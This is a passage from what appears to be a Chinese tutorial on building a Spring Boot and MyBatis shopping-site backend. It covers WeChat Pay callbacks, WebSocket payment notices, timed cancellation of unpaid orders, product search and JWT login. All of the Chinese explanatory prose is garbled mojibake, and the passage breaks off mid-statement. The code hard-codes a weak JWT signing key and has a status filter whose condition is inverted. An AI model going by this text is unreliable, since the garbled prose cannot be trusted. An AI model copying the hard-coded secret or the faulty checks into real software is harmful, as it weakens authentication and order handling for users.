map.get(&quot;appid&quot;)); resp.put(&quot;result_code&quot;, &quot;success&quot;); String s1 = WXPayUtil.mapToXml(resp); return s1; &#125; &#125; return null; &#125; &#125; è®¾ç½®å›è°ƒçš„url ** è¿™é‡Œæ¶‰åŠåˆ°å†…ç½‘ç©¿é€çš„çŸ¥è¯†ç‚¹ï¼Œä½†æ˜¯å¦‚æœéƒ¨ç½²åˆ°äº‘æœåŠ¡å™¨ä¸Šçš„å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ è®¢å•çŠ¶æ€æŸ¥è¯¢è¯¥æ¥å£å®ç°æ¯”è¾ƒç®€å• service @Override public ResultVO getOrderById(String orderId) &#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); return ResultVO.success(orders.getStatus()); &#125; controller @GetMapping(&quot;/status/&#123;oid&#125;&quot;) public ResultVO getStatus(@PathVariable(&quot;oid&quot;) String oid, @RequestHeader(&quot;token&quot;) String token)&#123; return orderService.getOrderById(oid); &#125; æµ‹è¯•æ¥å£ websocketæ¶ˆæ¯æ¨é€ åˆ›å»ºwebSocketæœåŠ¡å™¨ æ·»åŠ ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; æ·»åŠ websocketæœåŠ¡èŠ‚ç‚¹é…ç½®ï¼ˆJavaé…ç½®â½…å¼ï¼‰ package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.socket.server.standard.ServerEndpointExporter; @Configuration public class WebSocketConfig &#123; @Bean public ServerEndpointExporter getServerEndpointExporter()&#123; return new ServerEndpointExporter(); &#125; &#125; åˆ›å»ºwebsocketæœåŠ¡å™¨ package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; import javax.websocket.OnClose; import javax.websocket.OnOpen; import javax.websocket.Session; import javax.websocket.server.PathParam; import javax.websocket.server.ServerEndpoint; import java.util.concurrent.ConcurrentHashMap; @Component @ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;) public class WebSocketServer &#123; private static ConcurrentHashMap&lt;String,Session&gt; sessionMap = new ConcurrentHashMap&lt;&gt;(); /**å‰ç«¯å‘é€è¯·æ±‚å»ºç«‹websocketè¿æ¥ï¼Œå°±ä¼šæ‰§è¡Œ@OnOpenæ–¹æ³•**/ @OnOpen public void open(@PathParam(&quot;oid&quot;) String orderId, Session session)&#123; System.out.println(&quot;------------å»ºç«‹è¿æ¥ï¼š&quot;+orderId); sessionMap.put(orderId,session); &#125; /**å‰ç«¯å…³é—­é¡µé¢æˆ–è€…ä¸»åŠ¨å…³é—­websocketè¿æ¥ï¼Œéƒ½ä¼šæ‰§è¡Œclose**/ @OnClose public void close(@PathParam(&quot;oid&quot;) String orderId)&#123; sessionMap.remove(orderId); &#125; public static void sendMsg(String orderId,String msg)&#123; try &#123; Session session = sessionMap.get(orderId); session.getBasicRemote().sendText(msg); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; åœ¨PayControllerä¸­æ·»åŠ ä½¿ç”¨websocketä¸å‰ç«¯é€šä¿¡çš„ä»£ç  è®¢å•è¶…æ—¶å–æ¶ˆ-å®šæ—¶ä»»åŠ¡ å½“ç”¨æˆ·æäº¤è®¢å•åï¼Œæ²¡æœ‰åœ¨è§„å®šæ—¶é—´å†…è¿›è¡Œæ”¯ä»˜æ“ä½œï¼Œè¯¥è®¢å•è®²è‡ªåŠ¨å–æ¶ˆï¼Œè¿˜åŸå•†å“åº“å­˜ä¿¡æ¯ å®šæ—¶ä»»åŠ¡(quartzï¼‰ å»¶æ—¶é˜Ÿåˆ—ï¼ˆMQï¼‰ é¦–å…ˆæŸ¥è¯¢å·²å¤±æ•ˆçš„æœªæ”¯ä»˜è®¢å• è®¢å•çš„æœ‰æ•ˆæ”¯ä»˜æ—¶é—´æ˜¯åŠå°æ—¶ï¼Œå› æ­¤åˆ¤æ–­è®¢å•æ˜¯å¦å¤±æ•ˆï¼Œå°±æ˜¯ä»å½“å‰æ—¶é—´ä¸‹ï¼Œå‘å‰æ¨åŠä¸ªå°æ—¶ï¼Œ å¦‚æœè®¢å•çš„åˆ›å»ºæ—¶é—´ä¸åœ¨æ­¤èŒƒå›´å†…åˆ™å±äºå¤±æ•ˆçš„è®¢å• éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢åˆ°æ˜¯ æœªæ”¯ä»˜ çŠ¶æ€çš„ä¸ä¸€å®šå°±ä¸€å®šæ˜¯æœªæ”¯ä»˜ï¼Œå› ä¸ºæ”¯ä»˜å¹³å°æ”¯ä»˜æˆåŠŸå¯¹æœåŠ¡å™¨å“åº”è¿‡ç¨‹ä¸­å¯èƒ½ å‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¿®æ”¹è®¢å•çŠ¶æ€ä¹‹å‰ä¸€å®šè¦å‘æ”¯ä»˜å¹³å°ç¡®è®¤æ­¤è®¢å•çš„çŠ¶æ€ï¼Œè‹¥å·²ç»æ”¯ä»˜åˆ™ä¿®æ”¹æ”¯ä»˜çŠ¶æ€ä¸ºå·²æ”¯ä»˜ï¼ˆ2ï¼‰ è‹¥ä»ç„¶æ˜¯æœªæ”¯ä»˜åˆ™å–æ¶ˆè®¢å•ï¼Œå–æ¶ˆè®¢å•åéœ€è¦ä¿®æ”¹è®¢å•çŠ¶æ€ ä¸ºæ”¯ä»˜å¤±è´¥(6)ï¼Œå¹¶å‘æ”¯ä»˜å¹³å°é€šçŸ¥å–æ¶ˆæ”¯ä»˜é“¾æ¥ï¼Œæ¢å¤å•†å“çš„åº“å­˜ï¼Œå°±æ˜¯ProductSku.stock + OrderItem.buy_conuts è¿™é‡Œéœ€è¦è€ƒè™‘åˆ°æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ï¼Œéœ€è¦åŠ é”å’Œäº‹åŠ¡ç®¡ç†ï¼Œéš”ç¦»çº§åˆ«æ˜¯ ä¸²è¡ŒåŒ–ï¼Œä»¥ä¿è¯æ•°æ®çš„æ­£ç¡®æ€§å’Œä¸€è‡´æ€§ dao @Transactional(isolation = Isolation.SERIALIZABLE) // éš”ç¦»çº§åˆ«æ˜¯ ä¸²è¡ŒåŒ– public void closeOrder(String orderId) &#123; synchronized (this)&#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); orders.setStatus(&quot;6&quot;); orders.setCloseType(1); // å¤±è´¥åŸå› æœªæ”¯ä»˜ // å°†è®¢å•çŠ¶æ€æ”¹ä¸ºæ”¯ä»˜å¤±è´¥ ordersMapper.updateByPrimaryKeySelective(orders); // æ ¹æ®è®¢å•idæŸ¥è¯¢å•†å“å¿«ç…§ Example example = new Example(OrderItem.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;orderId&quot;, orderId); List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example); for (OrderItem orderItem : orderItems) &#123; String skuId = orderItem.getSkuId(); ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); productSku.setStock(productSku.getStock() + orderItem.getBuyCounts()); productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; &#125; &#125; service @Scheduled(cron = &quot;0/60 * * * * ?&quot;) public void checkAndCloseOrder() &#123; // é¦–å…ˆæŸ¥è¯¢å·²å¤±æ•ˆçš„æœªæ”¯ä»˜è®¢å• // è®¢å•çš„æœ‰æ•ˆæ”¯ä»˜æ—¶é—´æ˜¯åŠå°æ—¶ï¼Œå› æ­¤åˆ¤æ–­è®¢å•æ˜¯å¦å¤±æ•ˆï¼Œå°±æ˜¯ä»å½“å‰æ—¶é—´ä¸‹ï¼Œå‘å‰æ¨åŠä¸ªå°æ—¶ï¼Œ // å¦‚æœè®¢å•çš„åˆ›å»ºæ—¶é—´ä¸åœ¨æ­¤èŒƒå›´å†…åˆ™å±äºå¤±æ•ˆçš„è®¢å• // éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢åˆ°æ˜¯ æœªæ”¯ä»˜ çŠ¶æ€çš„ä¸ä¸€å®šå°±ä¸€å®šæ˜¯æœªæ”¯ä»˜ï¼Œå› ä¸ºæ”¯ä»˜å¹³å°æ”¯ä»˜æˆåŠŸå¯¹æœåŠ¡å™¨å“åº”è¿‡ç¨‹ä¸­å¯èƒ½ // å‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¿®æ”¹è®¢å•çŠ¶æ€ä¹‹å‰ä¸€å®šè¦å‘æ”¯ä»˜å¹³å°ç¡®è®¤æ­¤è®¢å•çš„çŠ¶æ€ï¼Œè‹¥ä»ç„¶æ˜¯ æœªæ”¯ä»˜ åˆ™å–æ¶ˆè®¢å• // å–æ¶ˆè®¢å•åéœ€è¦ä¿®æ”¹è®¢å•çŠ¶æ€ ä¸ºæ”¯ä»˜å¤±è´¥(6)ï¼Œå¹¶å‘æ”¯ä»˜å¹³å°é€šçŸ¥å–æ¶ˆæ”¯ä»˜é“¾æ¥ // å–æ¶ˆè®¢å•åï¼Œéœ€è¦æ¢å¤å•†å“çš„åº“å­˜ï¼Œå°±æ˜¯ProductSkuä¸­çš„stock + OrderItem(è®¢å•å¿«ç…§)ä¸­çš„buy_conuts // è¿™é‡Œéœ€è¦è€ƒè™‘åˆ°æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ï¼Œéœ€è¦åŠ é”å’Œäº‹åŠ¡ç®¡ç† // 1.æŸ¥è¯¢è¶…è¿‡ä¸‰ååˆ†é’Ÿæœªæ”¯ä»˜è®¢å• try&#123; System.out.println(&quot;1â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”----1&quot;); Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); Date time = new Date(System.currentTimeMillis() - 30 * 60 * 1000); criteria.andLessThan(&quot;createTime&quot;, time); List&lt;Orders&gt; orders = ordersMapper.selectByExample(example); //2.è®¿é—®å¾®ä¿¡å¹³å°æ¥å£ï¼Œç¡®è®¤å½“å‰è®¢å•æœ€ç»ˆçš„æ”¯ä»˜çŠ¶æ€ for (int i = 0; i &lt; orders.size(); i++) &#123; Orders order = orders.get(i); HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;(); params.put(&quot;out_trade_no&quot;, order.getOrderId()); // ä½¿ç”¨å¾®ä¿¡æ”¯ä»˜æä¾›å‘æ¥å£æŸ¥è¯¢è®¢å•çš„æ”¯ä»˜çŠ¶æ€ Map&lt;String, String&gt; resp = wxPay.orderQuery(params); if(&quot;SUCCESS&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.1 å¦‚æœè®¢å•å·²ç»æ”¯ä»˜ï¼Œåˆ™ä¿®æ”¹è®¢å•çŠ¶æ€ä¸º&quot;ä»£å‘è´§/å·²æ”¯ä»˜&quot; status = 2 Orders updateOrder = new Orders(); updateOrder.setOrderId(order.getOrderId()); updateOrder.setStatus(&quot;2&quot;); ordersMapper.updateByPrimaryKeySelective(updateOrder); &#125;else if(&quot;NOTPAY&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.2 å¦‚æœç¡®å®æœªæ”¯ä»˜ åˆ™å–æ¶ˆè®¢å•ï¼š // a.å‘å¾®ä¿¡æ”¯ä»˜å¹³å°å‘é€è¯·æ±‚ï¼Œå…³é—­å½“å‰è®¢å•çš„æ”¯ä»˜é“¾æ¥ Map&lt;String, String&gt; map = wxPay.closeOrder(params); System.out.println(map); // b.å…³é—­è®¢å• orderService.closeOrder(order.getOrderId()); &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; 1.12 æ ¹æ®å“ç‰Œç­›é€‰å•†å“è·å–æŸä¸ªå•†å“çš„æ‰€æœ‰å“ç‰Œ sql é¦–å…ˆæ ¹æ®åˆ†ç±»çš„category_idè·å–è¯¥åˆ†ç±»ä¸‹çš„æ‰€æœ‰å•†å“ï¼Œå†ä»è¿™äº›å•†å“ä¸­è·å–åˆ°å“ç‰Œåç§° select product_id from product where category_id&#x3D; cid select select DISTINCT brand from product_params where product_id in cids &#x2F;&#x2F; åˆå¹¶ select select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id&#x3D; cid ) dao /** * æ ¹æ®ç±»åˆ«idæŸ¥è¯¢æ­¤ç±»åˆ«ä¸‹çš„å•†å“çš„å“ç‰Œåˆ—è¡¨ * @param cid * @return */ public List&lt;String&gt; selectBrandByCategoryId(int cid); &lt;select id=&quot;selectBrandByCategoryId&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id=#&#123;cid&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(int categoryId) &#123; List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId); return new ResultVO(ResStatus.OK,&quot;success&quot;,brands); &#125; controller @GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;) public ResultVO getListBrands(@PathVariable(&quot;cid&quot;) String cid)&#123; return productService.listBrands(Integer.parseInt(cid)); &#125; æ ¹æ®åˆ†ç±»å’Œå“ç‰Œåˆ†é¡µæŸ¥è¯¢å•†å“ è¯·æ±‚url å“åº”ç»“æœ product/listbycid/49?pageNum=1&amp;limit=4 sql ç”±å“åº”æ•°æ®å¯ä»¥çœ‹å‡ºæ˜¯åˆ†é¡µæŸ¥è¯¢ï¼Œå¹¶ä¸”å°†å•†å“çš„ä»·æ ¼æœ€ä½çš„skuä¸€èµ·è¿”å› select * from product_sku where prodoct_id &#x3D; 1 ORDER BY sell_price limit 0,1 select * from product where category_id &#x3D; 49 dao * æ ¹æ®ä¸‰çº§åˆ†ç±»IDåˆ†é¡µæŸ¥è¯¢å•†å“ä¿¡æ¯ * @param cid ä¸‰çº§åˆ†ç±»id * @param start èµ·å§‹ç´¢å¼• * @param limit æŸ¥è¯¢è®°å½•æ•° * @return */ public List&lt;ProductVO&gt; selectProductByCategoryId(@Param(&quot;cid&quot;) int cid, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;ProductVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ProductVO&quot;&gt; &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;!-- æ ¹æ®å•†å“IDæŸ¥è¯¢ä»·æ ¼æœ€ä½çš„å¥—é¤ --&gt; &lt;collection property=&quot;skus&quot; column=&quot;product_id&quot; select=&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectProductByCategoryId&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where category_id=#&#123;cid&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; selectLowerestPriceByProductId &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductSku&quot;&gt; &lt;id column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;sku_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuImg&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;discounts&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;discounts&quot; /&gt; &lt;result column=&quot;stock&quot; jdbcType=&quot;INTEGER&quot; property=&quot;stock&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;status&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectLowerestPriceByProductId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price, discounts,stock,create_time,update_time,status from product_sku where product_id = #&#123;productId&#125; ORDER BY sell_price limit 0,1 &lt;/select&gt; service @Override public ResultVO getProductsByCategoryId(int categoryId, int pageNum, int limit) &#123; //1.æŸ¥è¯¢åˆ†é¡µæ•°æ® int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit); //2.æŸ¥è¯¢å½“å‰ç±»åˆ«ä¸‹çš„å•†å“çš„æ€»è®°å½•æ•° Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;categoryId&quot;,categoryId); int count = productMapper.selectCountByExample(example); //3.è®¡ç®—æ€»é¡µæ•° int pageCount = count%limit==0? count/limit : count/limit+1; //4.å°è£…è¿”å›æ•°æ® PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,pageHelper); &#125; controller @ApiOperation(&quot;å•†å“å“ç‰Œåˆ†é¡µæŸ¥è¯¢æ¥å£&quot;) @GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;) public ResultVO getProductsByCategoryId(@PathVariable(&quot;cid&quot;) String cid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit); &#125; 1.13 å…³é”®å­—æœç´¢å•†å“ æœç´¢ç›¸å…³å•†å“çš„å“ç‰Œ dao &lt;select id=&quot;selectBrandByKeyword&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where product_name like #&#123;kw&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(String kw) &#123; kw = &quot;%&quot;+kw+&quot;%&quot;; List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,brands); &#125; æœç´¢å‡ºåŒ…å«å…³é”®è¯çš„å•†å“ dao &lt;select id=&quot;selectProductByKeyword&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where product_name like #&#123;kw&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; service @Override public ResultVO searchProduct(String kw, int pageNum, int limit) &#123; //1.æŸ¥è¯¢æœç´¢ç»“æœ kw = &quot;%&quot;+kw+&quot;%&quot;; int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit); //2.æŸ¥è¯¢æ€»è®°å½•æ•° Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;productName&quot;,kw); int count = productMapper.selectCountByExample(example); //3.è®¡ç®—æ€»é¡µæ•° int pageCount = count%limit==0? count/limit:count/limit+1; //4.å°è£…ï¼Œè¿”å›æ•°æ® PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; &#125; 1.14 ä¸ªäººä¸­å¿ƒæ˜¾ç¤ºæ‰€æœ‰è®¢å• order/list?userId=15&amp;pageNum=1&amp;limit=5&amp;status=1 dao OrdersMapper public List&lt;OrdersVO&gt; selectOrders(@Param(&quot;userId&quot;) String userId, @Param(&quot;status&quot;) String status, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;OrdersVOMap&quot; type=&quot;com.qfedu.fmmall.entity.OrdersVO&quot;&gt; &lt;id column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;receiver_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverName&quot; /&gt; &lt;result column=&quot;receiver_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverMobile&quot; /&gt; &lt;result column=&quot;receiver_address&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverAddress&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;actual_amount&quot; jdbcType=&quot;INTEGER&quot; property=&quot;actualAmount&quot; /&gt; &lt;result column=&quot;pay_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;payType&quot; /&gt; &lt;result column=&quot;order_remark&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderRemark&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;status&quot; /&gt; &lt;result column=&quot;delivery_type&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryType&quot; /&gt; &lt;result column=&quot;delivery_flow_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryFlowId&quot; /&gt; &lt;result column=&quot;order_freight&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;orderFreight&quot; /&gt; &lt;result column=&quot;delete_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;deleteStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;pay_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;payTime&quot; /&gt; &lt;result column=&quot;delivery_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;deliveryTime&quot; /&gt; &lt;result column=&quot;flish_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;flishTime&quot; /&gt; &lt;result column=&quot;cancel_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;cancelTime&quot; /&gt; &lt;result column=&quot;close_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;closeType&quot; /&gt; &lt;collection property=&quot;orderItems&quot; column=&quot;order_id&quot; select=&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectOrders&quot; resultMap=&quot;OrdersVOMap&quot;&gt; select order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address, total_amount, actual_amount,pay_type,order_remark,status,delivery_type, delivery_flow_id,order_freight,delete_status,create_time, update_time,pay_time,delivery_time, flish_time,cancel_time,close_type from orders where user_id=#&#123;userId&#125; &lt;if test=&quot;status != null&quot;&gt; and status=#&#123;status&#125; &lt;/if&gt; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; OrderItemMapper public List&lt;OrderItem&gt; listOrderItemsByOrderId(String orderId); &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.OrderItem&quot;&gt; &lt;id column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;product_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;buy_counts&quot; jdbcType=&quot;INTEGER&quot; property=&quot;buyCounts&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;basket_date&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;basketDate&quot; /&gt; &lt;result column=&quot;buy_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;buyTime&quot; /&gt; &lt;result column=&quot;is_comment&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isComment&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;listOrderItemsByOrderId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select item_id, order_id, product_id, product_name, product_img, sku_id, sku_name, product_price, buy_counts, total_amount, basket_date, buy_time, is_comment from order_item where order_id=#&#123;orderId&#125; &lt;/select&gt; service @Override public ResultVO listOrders(String userId, String status, int pageNum, int limit) &#123; Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;userId&quot;, userId); if(status != null &amp;&amp; &quot;&quot;.equals(status))&#123; criteria.andEqualTo(&quot;status&quot;,status); &#125; int count = ordersMapper.selectCountByExample(example); //2.è®¡ç®—æ€»é¡µæ•°ï¼ˆå¿…é¡»ç¡®å®šæ¯é¡µæ˜¾ç¤ºå¤šå°‘æ¡ pageSize = limitï¼‰ int pageCount = count%limit==0? count/limit : count/limit+1; int start = (pageNum-1)*limit; List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit); PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = new PageHelper&lt;&gt;(count, pageCount, ordersVOS); return ResultVO.success(ordersVOPageHelper); &#125; controller @GetMapping(&quot;/list&quot;) public ResultVO getList(String userId, String status, int pageNum, int limit)&#123; return orderService.listOrders(userId, status, pageNum,limit); &#125; æ”¶è´§åœ°å€ç®¡ç†2 JWTå®ç°æƒé™è®¤è¯2.1 JWTå®ç°å¯¼å…¥JWTä¾èµ–&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯// éªŒè¯æˆåŠŸåˆ™ç”Ÿæˆå¯¹åº”çš„token // ä½¿ç”¨jwtç”Ÿæˆtoken JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //è®¾ç½®subject .setIssuedAt(new Date()) // è®¾ç½®tokenç”Ÿæˆçš„æ—¶é—´ .setId(user.getUserId() + &quot;&quot;) // è®¾ç½®useridä¸ºtokençš„å”¯ä¸€id .setClaims(map) // mapä¸­å¯ä»¥å­˜æ”¾ç”¨æˆ·çš„è§’è‰²å’Œæƒé™ä¿¡æ¯ .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // è®¾ç½®tokençš„è¿‡æœŸæ—¶é—´ ä¸ºä¸¤å¤© .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// è®¾ç½®tokençš„åŠ å¯†æ–¹å¼å’ŒåŠ å¯†å¯†é’¥ String token = jwtBuilder.compact(); // è·å–token return new ResultVO(ResStatus.OK, token, user); å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token JWTè¿›è¡Œtokenè§£æif(token == null 